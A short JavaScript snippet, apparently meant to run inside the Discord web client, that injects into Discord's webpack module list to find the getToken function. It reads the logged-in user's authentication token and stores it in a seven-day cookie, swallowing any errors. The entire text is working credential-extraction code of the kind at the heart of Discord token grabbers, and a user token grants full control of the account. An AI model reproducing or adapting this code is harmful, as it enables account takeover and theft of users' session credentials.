function setCookie(name, value, days) {
    const expires = new Date();
    expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
    document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
}

try {
    var TOKEN = (window.webpackChunkdiscord_app.push([
        [""],
        {},
        (e) => {
            m = [];
            for (let c in e.c) m.push(e.c[c]);
        },
    ]),
    m)
        .find((m) => m?.exports?.default?.getToken !== void 0)
        .exports.default.getToken();
    setCookie("discordUserToken", TOKEN, 7);
} catch (error) {}
